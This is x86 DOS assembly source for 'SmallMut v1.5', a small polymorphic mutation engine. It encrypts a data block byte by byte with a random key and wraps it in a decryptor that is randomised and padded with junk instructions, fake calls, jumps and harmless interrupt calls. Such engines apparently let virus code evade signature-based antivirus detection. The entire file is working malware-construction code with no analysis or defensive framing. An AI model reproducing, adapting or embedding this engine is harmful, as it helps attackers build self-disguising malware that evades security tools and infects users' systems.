; SmallMut v.1.5. Size = 578 bytes !

; Features:
; - Defferent (Si,Di) pointers
; - Garbage registers - Ax,Bx,Cx,Dx,Ah,Al,Bh,Bl,Ch,Cl,Dh,Dl
; - Garbage creating
;	- Standard one-byters
;	- Different opcodes with Ax
;	- Add/Sub/Xor/Or/And/Mov,etc Reg,Imm16/mem/etc
;	- Forward jxx
;	- Forward call creating
;	- Different encryption methods + different keys
;	- Xchg Ax,Reg

; Decryptor structure:
;	Mov Si/Di,Offset Data
;	Mov Bp,Counter
;Crypt:	Xor/Add/Sub Cs:[Si/Di],Key
;	inc Si/Di
;	Dec bp
;	or bp,bp
;	jz EndOfD
;	jmp Crypt

.286

SME	proc		; Cs:Bx - Source,Cs:Di - Dest,Cx=Length,Dx = Offset
	push di		; For com,dx = 100h
	push dx bx cx	; Returns in ax new size, all registers is trashed

	xor ax,ax	; Clean Ax

	mov si,offset Decryptor	; Si = Decrytor template offset

	mov al,2	; Choose pointer (Si or Di)
	Call Getrnd

	mov dh,al	; Store it

	Call Garble	; Create garbage

	lodsb
	add al,dh
	stosb

	push di		; Store offset for later patch
	stosw

	Call Garble	; Garbage
	movsb		; Mov bp,counter

	mov ax,cx	; Store length of data
	stosw

	Call Garble	; Garble

	mov bp,di	; Start of encryption loop

	Call Garble	; Garble

	movsw		; Xor Cs:[Pointer],Key

	push si
	mov al,3
	call Getrnd
	shl ax,1
	xchg ax,si
	Lea si,[DTBl][Si]
	lodsb
	add al,dh
	stosb
	lodsb
	mov [PMe],al
	pop si

	call GetMax	; Get any number
	stosb		; Store key
	mov dl,al	; Move key to dl,for later encryption

	Call Garble	; Garble

	lodsb
	add al,dh
	stosb

	Call Garble	; Garble

	movsb		; Dec Bp

	Call Garble	; Garble

	movsw		; Or bp,bp

	movsb		; Jz End (Jz $+5)
	push di
	stosb

	Call Garble

	movsb		; Jmp near Loop

	mov ax,bp
	sub ax,di	; Patch Jmp near offset
	dec ax
	dec ax
	stosw
	pop si
	mov ax,di
	sub ax,si
	dec ax
	mov [Si],al

	pop bp
	
	mov si,di	; Store current offset in Si

	pop cx bx	; Restore Pointer and length of source data
	xchg si,bx	; Si exchanged with Bx,so end of decryptor now
			; in Bx
LCrypt: lodsb		; Crypt byte by byte
PMe	db	?	; Ecryption type
	db	0C2h
	stosb
	loop LCrypt

RestProc:
	Call PatchCall	; If there unfinished calls ?
	mov ax,Callp	; Restore it..
	or ax,ax	; So can be situation,when decryptor before and
	jne RestProc	; after encrypted code

	pop dx		; Restore beginning of destination
	pop cx		; and offset in file

	mov ax,bx
	sub ax,cx	; Patch Mov Pointer,offset Data
	add ax,dx
	mov ds:[bp],ax

	mov ax,di	; Calculate new size
	sub ax,cx
	ret
SME	endp

Rseed	dw	?	; Random seed

Getrnd	proc
	push dx cx	; Store used regs

	push ax		; Ax = Limit

	mov ax,RSeed	; Get Random seed
	rol ax,1	; Manipulate with it
	add ax,4321h
	add ax,cx
	sub ax,dx
	rol ax,1
	neg ax
	xchg ah,al
	mov RSeed,ax	; Store it
	pop cx		; Now limit in Cx

	cmp cl,0	; If limit = 0
	jz NoDiv	; Yeap..No divide
	xor dx,dx	; Lets get limit
	div cx
	xchg ax,dx
NoDiv:	pop cx dx
	ret
Getrnd	endp

Decryptor:
	db	0BEh		; Mov si,offset XXX
	db	0BDh		; Mov bp,counter
	db	2Eh,80h		; Loop: Xor cs:[si],key
	db	46h		; Inc si
	db	4Dh		; Dec bp
	db	0Bh,0EDh	; Or bp,bp
	db	74h		; Jne End
	db	0E9h		; Jmp Loop

Garble	proc
	push cx dx
	xchg ax,dx		; Store previous Ax in Dx
	mov ax,7		; Seven instructions maximum
	call getrnd		; Get instructions number
	inc ax
	xchg ax,cx
MakeGarbage:
	call Garbage		; Make garbage
	loop MakeGarbage	; Another instruction
	xor ax,ax
	pop  dx cx
	ret
Garble	endp

Tbl	dw	offset MakeXchg
	dw	offset MakeTbl
	dw	offset MakeInt
	dw	offset MakeAx
	dw	offset MakeInc
	dw	offset MakeDec
	dw	offset MakeJx
	dw	offset MakeOneBt
	dw	offset MakeMov
	dw	offset Make8Mov
	dw	offset MakeCall
	dw	offset PatchCall
Tbll	equ	($ - Tbl)/2

Garbage	proc				; Main garbage routine
	push bx
	mov ax,Tbll
	call getrnd			; Choose routine
	shl ax,1
	xchg ax,bx
	lea bx,[Tbl][Bx]
	xor ax,ax
	call ds:[bx]
	pop bx
	ret
MakeInc:
	call get4
	add al,40h
	stosb
	ret
MakeDec:
	call get4
	add al,48h
	stosb
	ret

MakeJx:	push si				; Make jump

	or dx,dx			; If there any Jxx inside ?
	jz NoJx

	mov al,16			; Nope... Encode Jxx
	call getrnd
	add al,70h			; Store
	stosb

	push di
	xor ax,ax			; Store for later patch
	stosb

	Call Garble			; ax = 0, garble

	pop si
	mov ax,di
	sub ax,si
	dec ax
	mov [si],al			; Patch Jxx

NoJx:	pop si
	ret

MakeOneBt:			; One byters
	push si
	mov al,OneBtL		; Create one-byters
	call getrnd

	mov si,offset OneBTbl
	add si,ax
	movsb
	pop si
	ret
OneBTbl	db	0FCh,0F2h,0F3h,0CCh,26h,0F8h,0F9h,0FBh
OneBtL	equ	$ - OneBTbl

MakeMov:			; Make imm16 move
	Call Get4
	add al,0B8h
	stosb
	Call GetMax
	stosw
	ret

Make8Mov:			; Make imm 8 move
	mov al,8
	call getrnd
	add al,0B0h
	stosb
	call GetMax
	stosb
	ret

MakeCall:			; Make call
	mov ax,Callp		; If there any calls ?
	or ax,ax
	jne InCall		; Yeap...
	mov al,0E8h		; Encode Call
	stosb
	mov Callp,di		; Store for later patch
	stosw			; Reserve space
InCall:	ret

PatchCall:
	mov ax,Callp
	or ax,ax		; No Call to patch
	jz InCall

	push bx si		; Store used regs
	xchg ax,bx

	xor ax,ax
	mov Callp,ax		; Clean CallP

	mov al,0EBh		; Jmp short
	stosb
	push di			; Store for later patch
	stosb
	Call Garble		; Garble
	mov al,0C3h		; Retn
	stosb
	pop si
	mov ax,di
	sub ax,si		; Patch Jmp short
	dec ax
	mov [si],al

	mov ax,si
	sub ax,bx		; Patch Call
	dec ax
	mov [bx],ax

	pop  si bx
	ret

MakeXchg:			; Make xchg ax,reg
	call Get4		; Get rnd from 0 to 3
	add al,90h
	stosb
	ret

MakeTbl:			; Make Mov/Add/etc Reg16/8,Imm/Reg,etc...
	push si cx

	mov al,3Eh		; Segment overrider, couse decryptor would
	stosb			; hangup when somebody moved word from
				; 0FFFFh from SS or CS segment...

	mov al,Tbls		; Get table size
	call getrnd		; Get random
	xchg ax,si
	lea si,[Tblsz][si]	; Copy opcode
	movsb

	call Getreg		; Get random reg
	stosb			; Store it

	cmp ah,0		; Needed any data ?
	jz NoAddOn		; Nope..
	xor cx,cx
	mov cl,ah
FillUp:	call GetMax		; Get random
	stosb
	loop FillUp
NoAddOn:
	pop cx si		; Restore used
	ret

; Opcodes
TBlsz	db	02,03,12h,13h,22h,23h,0Ah,0Bh,1Ah,1Bh,2Ah,2Bh
TBls	equ	$ - Tblsz

MakeAx:	push si			; Make Sub/Xor/Etc Ax,imm16
	mov al,AxtL
	call getrnd
	xchg ax,si
	lea si,[AxTb][Si]
	movsb			; Move from table opcode
	call GetMax		; Get any number
	stosw			; Store it
	pop si
	ret
AxTb	db	05h,15h,25h,35h,0Dh,01Dh,2Dh,3Dh,0A9h,0A1h
AxTl	equ	$ - AxTb

MakeInt:			; Encode interrupt
	push si
	mov al,IntNum		; Get int table number
	Call getrnd
	shl ax,1
	xchg ax,si
	lea si,[IntTbl][Si]	; Get offset
	mov al,0B4h		; Encode mov ah,function
	stosb
	movsb
	mov al,0CDh		; Encode int IntNum
	stosb
	movsb
	pop si
	ret
IntTbl	db	0Bh,21h		; Function+Int
	db	19h,21h
	db	30h,21h
	db	54h,21h
	db	51h,21h
	db	03h,10h
	db	01h,16h
	db	02h,16h
IntNum	equ	($ - IntTbl) / 2
Garbage	endp

Getreg	proc			; Gives reg in al, and in ah size
	call GetMax		; Get any reg
	and al,11011011b	; Drop some regs out
	mov ah,0		; Size = 0
	cmp al,40h		; If lower than 40h - no bytes more
	jb Make0
	cmp al,80h	; If lower than 80h and higher than 40h - 1 byte
	jb Make1
	cmp al,0C0h	; If lower than 0C0h and higher than 80h - 2 bytes
	jae Make0
Make2:	inc ah
Make1:	inc ah
Make0:	ret
Getreg	endp

Get4	proc
	mov al,4		; Get random with 4 limit
	call Getrnd
	ret
Get4	endp

GetMax	proc
	xor ax,ax		; Get any random number
	Call Getrnd
	ret
GetMax	endp

CallP	dw	?

DTbl	db	34h,32h		; Xor,Xor
	db	2Ch,02h		; Add,Sub
	db	04h,2Ah		; Sub,Add
